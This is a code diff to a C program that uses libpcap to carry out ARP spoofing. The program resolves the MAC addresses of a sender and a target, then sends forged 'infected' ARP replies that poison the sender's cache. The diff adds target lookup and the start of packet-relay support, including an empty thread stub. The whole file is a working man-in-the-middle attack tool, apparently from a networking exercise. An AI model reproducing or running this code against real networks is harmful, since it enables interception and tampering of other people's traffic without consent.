@@ -18,6 +18,8 @@
 #include <netinet/if_ether.h>
 #include <net/if_arp.h>
 #include <net/ethernet.h>
+#include <pthread.h>
+#include <netinet/ip.h>
 
 /* ARP Header, (assuming Ethernet+IPv4)                   */ 
 #define ETHERNET 1
@@ -37,6 +39,20 @@ typedef struct arpheader {
     uint32_t tpa;              /* Target IP address       */ 
 } __attribute__((packed)) arphdr_t; 
 
+void *t_function(void *data)
+{
+	pid_t pid;            // process id
+	pthread_t tid;        // thread id
+
+	pid = getpid();
+	tid = pthread_self();
+
+	char* thread_name = (char*)data;
+	int i = 0;
+ 	printf("thread\n");
+	
+}
+
 int main(int argc, char *argv[])
 {
 	int fd;
@@ -54,12 +70,15 @@ int main(int argc, char *argv[])
 	struct ether_header *ethhdr;
 	char packet[100];
 	char infect[100];
+	char relay[100];
 
 	arphdr_t *arpheader = NULL;
 
 	struct ether_header *reply_eth;
 	arphdr_t *reply_arp;
+	struct ip *reply_ip;
 	unsigned char sender_mac[6]; 
+	unsigned char target_mac[6];
 
 	if (argc != 4) {
 		printf("input needed: <dev> <sender_ip> <target_ip> \n");
@@ -72,6 +91,7 @@ int main(int argc, char *argv[])
 
 	printf("============= Send ARP =============\n");
 
+	printf("******* get attacker's info *******\n");
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 	if(fd < 0) perror("socket fail");
 
@@ -81,7 +101,6 @@ int main(int argc, char *argv[])
 
 	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
 
-	printf("******* get attacker's info *******\n");
 	printf("attacker MAC %x:%x:%x:%x:%x:%x \n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]); 	 
 	
 	/* Get ip address */
@@ -95,6 +114,8 @@ int main(int argc, char *argv[])
 		printf("Couldn't open device %s : %s\n", dev, errbuf);
 		return 2;
 	}
+
+	printf("******** get target's info ********\n");
 
 	/* Make Ethernet packet */
 	ethhdr = (struct ether_header *)packet;
@@ -112,7 +133,7 @@ int main(int argc, char *argv[])
 	memcpy(arpheader->sha, attacker_mac, 6);
 	arpheader->spa = inet_addr(attacker_ip);
 	memcpy(arpheader->tha, "\x00\x00\x00\x00\x00\x00",6);
-	arpheader->tpa = inet_addr(sender_ip);
+	arpheader->tpa = inet_addr(target_ip);
 
 	/* Send ARP request */
 	pcap_sendpacket(handle, packet, PACKET_SIZE);	
@@ -141,11 +162,55 @@ int main(int argc, char *argv[])
 		if(reply_arp->ptype != htons(ETHERTYPE_IP)) continue;
 		if(reply_arp->oper != htons(ARP_REPLY)) continue;
 		if(reply_arp->spa != arpheader->tpa) continue;
+		memcpy(target_mac, reply_arp->sha, 6);
+		break;
+	}
+
+	printf("******** get sender's info ********\n");
+
+	/* Make Ethernet packet */
+	ethhdr = (struct ether_header *)packet;
+	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
+	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = '\xff';
+	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
+	
+	/* Make ARP packet */
+	arpheader = (struct arpheader *)(packet+14);
+	arpheader->htype = ntohs(ETHERNET);
+	arpheader->ptype = ntohs(ETHERTYPE_IP);
+	arpheader->hlen = sizeof(arpheader->sha); 
+	arpheader->plen = sizeof(arpheader->spa);
+	arpheader->oper = ntohs(ARP_REQUEST);
+	memcpy(arpheader->sha, attacker_mac, 6);
+	arpheader->spa = inet_addr(attacker_ip);
+	memcpy(arpheader->tha, "\x00\x00\x00\x00\x00\x00",6);
+	arpheader->tpa = inet_addr(sender_ip);
+
+	/* Send ARP request */
+	pcap_sendpacket(handle, packet, PACKET_SIZE);	
+
+	/* Get ARP reply */
+	while(1) {
+		res = pcap_next_ex(handle, &header, &reply_packet);
+		if(res < 0) exit(1);
+		else if(res == 0) {
+			if(pcap_sendpacket(handle, packet, PACKET_SIZE)) {
+                		exit(1);
+           		}
+			continue;
+		}
+
+		reply_eth = (struct ether_header *)reply_packet;
+		if(reply_eth->ether_type != htons(ETHERTYPE_ARP)) continue;
+		
+		reply_arp = (struct arphdr_t *)(reply_packet + ETHER_HLEN);
+		if(reply_arp->ptype != htons(ETHERTYPE_IP)) continue;
+		if(reply_arp->oper != htons(ARP_REPLY)) continue;
+		if(reply_arp->spa != arpheader->tpa) continue;
 		memcpy(sender_mac, reply_arp->sha, 6);
 		break;
 	}
 
-	printf("******** get sender's info ********\n"); 
 	printf("sender MAC   %x:%x:%x:%x:%x:%x \n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); 
 	printf("sender IP    %s\n", sender_ip);
 
@@ -167,7 +232,7 @@ int main(int argc, char *argv[])
 	memcpy(arpheader->tha, sender_mac,6);
 	arpheader->tpa = inet_addr(sender_ip);
 
-	/* Send ARP request */
+	/* Send ARP reply */
 	printf("****** send infected packet *******\n");
 	printf("src MAC      %x:%x:%x:%x:%x:%x \n", arpheader->sha[0], arpheader->sha[1], arpheader->sha[2], arpheader->sha[3], arpheader->sha[4], arpheader->sha[5]);
 	printf("src IP       %s\n", target_ip);
